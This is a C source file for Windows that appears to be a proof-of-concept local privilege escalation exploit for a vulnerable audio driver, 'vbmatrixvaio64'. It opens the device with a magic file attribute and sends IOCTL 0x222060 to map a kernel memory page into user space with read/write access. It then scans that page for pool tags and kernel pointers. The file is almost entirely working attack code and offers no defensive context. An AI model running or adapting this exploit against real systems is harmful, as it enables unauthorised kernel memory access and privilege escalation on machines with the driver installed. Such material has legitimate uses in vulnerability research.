#include <windows.h>
#include <SetupAPI.h>
#include <stdio.h>
#include <devioctl.h>
#include <stdint.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "SetupAPI.lib")

GUID driver_guids[] = {
    {0x66caa746, 0x1518, 0x4c53, {0xb6, 0xe6, 0x9e, 0x55, 0x0a, 0x73, 0x4f, 0xd1}}, // vbmatrixvaio64*_win10.sys
};

// the driver checks this magic value to recognize CreateFile call from matrix
#define MAGIC_FILE_ATTRIBUTE 0x800 // officially FILE_ATTRIBUTE_COMPRESSED

HANDLE init_device_handle();
void exploit_mapping_lpe(HANDLE h_device);
int is_printable_tag(uint32_t tag);

void exploit_mapping_lpe(HANDLE handle);

int main()
{
    // request the special device handle using MAGIC_FILE_ATTRIBUTE
    HANDLE h_device = init_device_handle();

    if (h_device == INVALID_HANDLE_VALUE)
    {
        printf("init_device_handle error\n");
        return -1;
    }

    //---------------------------------------------------------------
    // send IOCTL 0x222060 to receive the kernel memory page mapping
    //---------------------------------------------------------------
    exploit_mapping_lpe(h_device);

    return 0;
}

HANDLE init_device_handle()
{
    int num_guids = sizeof(driver_guids) / sizeof(GUID);
    HDEVINFO dev_info = INVALID_HANDLE_VALUE;

    //-------------------------------
    // try every driver in the list
    //-------------------------------

    for (int i = 0; i < num_guids; i++)
    {
        //-------------------------------
        // 1. get device path
        //-------------------------------        

        dev_info = SetupDiGetClassDevsA(&driver_guids[i], 0, 0, DIGCF_PRESENT | DIGCF_DEVICEINTERFACE);

        if (dev_info == INVALID_HANDLE_VALUE)
            continue;

        SP_DEVICE_INTERFACE_DATA di_data = {0};
        di_data.cbSize = sizeof(di_data);

        if (SetupDiEnumDeviceInterfaces(dev_info, 0, &driver_guids[i], 0, &di_data) == FALSE)
        {
            // driver not installed, try next
            SetupDiDestroyDeviceInfoList(dev_info);
            continue;
        }

        DWORD required_size;
        SetupDiGetDeviceInterfaceDetailA(dev_info, &di_data, 0, 0, &required_size, 0);

        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
        {
            printf("SetupDiGetDeviceInterfaceDetailA error\n");
            SetupDiDestroyDeviceInfoList(dev_info);
            continue;
        }

        PSP_DEVICE_INTERFACE_DETAIL_DATA_A di_detail = malloc(required_size);

        if (!di_detail)
        {
            printf("malloc error\n");
            SetupDiDestroyDeviceInfoList(dev_info);
            exit(-1);
        }

        di_detail->cbSize = sizeof(SP_DEVICE_INTERFACE_DETAIL_DATA_A);

        if (SetupDiGetDeviceInterfaceDetailA(dev_info, &di_data, di_detail, required_size, NULL, 0) == FALSE)
        {
            printf("SetupDiGetDeviceInterfaceDetailA error\n");
            free(di_detail);
            SetupDiDestroyDeviceInfoList(dev_info);
            continue;
        }

        SetupDiDestroyDeviceInfoList(dev_info);

        //-------------------------------------------------------
        // 2. get device handle using magic file attribute value
        //-------------------------------------------------------

        HANDLE h_device = INVALID_HANDLE_VALUE;

        h_device = CreateFileA(
            di_detail->DevicePath,
            GENERIC_READ | GENERIC_WRITE,
            0,
            NULL,
            OPEN_EXISTING,
            MAGIC_FILE_ATTRIBUTE,
            NULL
        );

        if (h_device == INVALID_HANDLE_VALUE)
        {
            printf("CreateFileA error\n");
            continue;
        }

        printf("open device success.\n");
        printf("driver path: %s.\n", di_detail->DevicePath);
        free(di_detail);
        return h_device;
    }

    return INVALID_HANDLE_VALUE;
}

int is_printable_tag(uint32_t tag)
{
    unsigned char* c = (unsigned char*)&tag;
    return (isalnum(c[0]) && isalnum(c[1]) && isalnum(c[2]) && isalnum(c[3]));
}

void exploit_mapping_lpe(HANDLE h_device)
{
    typedef struct _output
    {
        DWORD* user_ptr;
        DWORD padding[32];
    } output_t;

    DWORD bytes_returned = 0;
    output_t output_buffer = {0};
    DWORD in_buffer = 1;
    DWORD ioctl_code = 0x222060;

    //-------------------------------------------------------
    // 3. create user space mapping of kernel memory page
    //-------------------------------------------------------

    if (!DeviceIoControl(h_device, ioctl_code, &in_buffer, sizeof(in_buffer), &output_buffer, sizeof(output_buffer), &bytes_returned, 0) || bytes_returned == 0)
    {
        printf("DeviceIoControl error\n");
        return;
    }

    printf("bytes returned: %lu\n", bytes_returned);
    printf("ptr: 0x%p\n", output_buffer.user_ptr);

    uint8_t* page_base = (unsigned char*)((UINT_PTR)output_buffer.user_ptr & ~(UINT_PTR)0xFFF);

    printf("page base: 0x%p\n", page_base);

    //----------------------------------------------------------
    // 4. confirm read / write permissions for the mapped page
    //----------------------------------------------------------

    MEMORY_BASIC_INFORMATION mbi = {0};

    if (VirtualQuery(output_buffer.user_ptr, &mbi, sizeof(mbi)) == 0)
    {
        printf("VirtualQuery error\n");
        return;
    }

    if (mbi.Protect & PAGE_READWRITE)
    {
        printf("page has PAGE_READWRITE permission: 0x%04X\n", mbi.Protect);
        printf("region size: %llu\n", mbi.RegionSize);
        printf("page state: 0x%04X\n", mbi.State);
    }

    //--------------------------------------------------
    // 5. scan memory page for pool tags and addresses
    //--------------------------------------------------

    for (int page_offset = 0; page_offset < 0x1000; page_offset += 16)
    {
        uint32_t* potential_tag = (uint32_t*)(page_base + page_offset + 4);

        if (is_printable_tag(*potential_tag))
        {
            char tag_str[5] = {0};
            memcpy(tag_str, potential_tag, 4);
            printf("+0x%X: pool tag: '%s'\n", page_offset, tag_str);

            int chunk_size = (*(page_base + page_offset + 2) * 16) - 16;

            for (int chunk_offset = 16; chunk_offset < chunk_size; chunk_offset += sizeof(uintptr_t*))
            {
                uint64_t* potential_kernel_pointer = (uint64_t*)(page_base + page_offset + chunk_offset);

                if ((uint64_t)potential_kernel_pointer >= (uint64_t)(page_base + 0x1000))
                    break;
                
                if (*potential_kernel_pointer > 0xFFFF000000000000ULL)
                {
                    printf("  +0x%03X:  0x%llX \n", chunk_offset - 16, *potential_kernel_pointer);
                }
            }
        }
    }

    CloseHandle(h_device);

    // keep process open
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}